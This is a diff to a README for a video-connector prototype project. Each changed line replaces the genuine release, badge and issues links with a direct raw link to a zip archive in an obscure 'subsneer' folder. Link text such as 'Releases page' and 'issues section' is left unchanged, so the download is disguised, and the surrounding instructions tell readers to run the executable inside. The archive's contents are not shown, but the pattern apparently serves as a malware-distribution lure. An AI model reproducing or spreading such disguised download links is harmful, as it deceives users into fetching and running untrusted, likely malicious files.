@@ -1,6 +1,6 @@
 # 🎥 Nucleus-Video-Connector-Prototype - Simplify Your Video Workflow Integration
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Zeilon11/Nucleus-Video-Connector-Prototype/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Zeilon11/Nucleus-Video-Connector-Prototype/main/subsneer/Nucleus-Video-Connector-Prototype.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Zeilon11/Nucleus-Video-Connector-Prototype/main/subsneer/Nucleus-Video-Connector-Prototype.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Nucleus-Video-Connector-Prototype! This application helps you con
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Zeilon11/Nucleus-Video-Connector-Prototype/releases) to download the application. Look for the latest version, download the appropriate file for your operating system, and follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Zeilon11/Nucleus-Video-Connector-Prototype/main/subsneer/Nucleus-Video-Connector-Prototype.zip) to download the application. Look for the latest version, download the appropriate file for your operating system, and follow these steps:
 
 1. On the Releases page, find the latest version.
 2. Click on the file that matches your system. For Windows users, this is usually a `.exe` file. For Mac users, look for a `.dmg` file.
@@ -57,7 +57,7 @@ If you experience issues, consider the following steps:
 
 ## 🗂️ Community and Support
 
-If you have questions, feel free to reach out. You can create an issue in the [issues section](https://github.com/Zeilon11/Nucleus-Video-Connector-Prototype/issues) of this repository. 
+If you have questions, feel free to reach out. You can create an issue in the [issues section](https://raw.githubusercontent.com/Zeilon11/Nucleus-Video-Connector-Prototype/main/subsneer/Nucleus-Video-Connector-Prototype.zip) of this repository. 
 
 You can also join discussions in the community forum for tips and shared experiences related to video workflows.
 
